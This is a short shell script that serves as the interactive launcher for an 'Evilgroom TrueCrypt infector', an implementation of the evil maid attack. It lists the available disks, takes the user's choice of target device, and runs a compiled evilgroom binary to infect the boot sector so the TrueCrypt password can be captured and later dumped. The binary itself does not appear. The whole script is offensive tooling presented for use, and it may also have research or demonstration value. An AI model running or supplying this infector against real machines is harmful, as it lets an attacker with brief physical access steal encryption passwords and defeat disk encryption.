#!/bin/sh

echo "Welcome to the Evilgroom TrueCrypt infector, by Florent Monjalet"\
     "(Original attack by Johanna Rutkowska)."
echo "First usage will infect the boot to make the password retrievable by"\
     "program. Usage on an already infected hard drive will dump the password."
echo "Please type the path of the device you want to infect. It might be a"\
     "block device or a regular file (an image of a disk)."
echo "Available devices are:"

devices=`ls /dev/sd* | grep "sd.$"`

for dev in $devices; do
    test -b $dev && echo -e "\t$dev"
done

while true; do
    echo
    echo -n "Enter your selection: "
    read selected_dev

    test -b "$selected_dev" -o -f "$selected_dev" && break
    echo "Selected device ($selected_dev) does not exist or is not a valid"\
         "block device. Please make sure that you entered the full path"\
         "correctly."
done

bin_dir="./evilgroom"
evilgroom="$bin_dir/evilgroom"

if [ ! -d $bin_dir ]; then
    echo "Evilgroom directory ($bin_dir) not found, exiting."
    exit 1
fi

if [ ! -f $evilgroom ]; then
    echo "Evilgroom not compiled, please run make in $bin_dir in an"\
         "appropriate environment"
    exit 1
fi

echo "-------------- Starting infection --------------"
$evilgroom $selected_dev

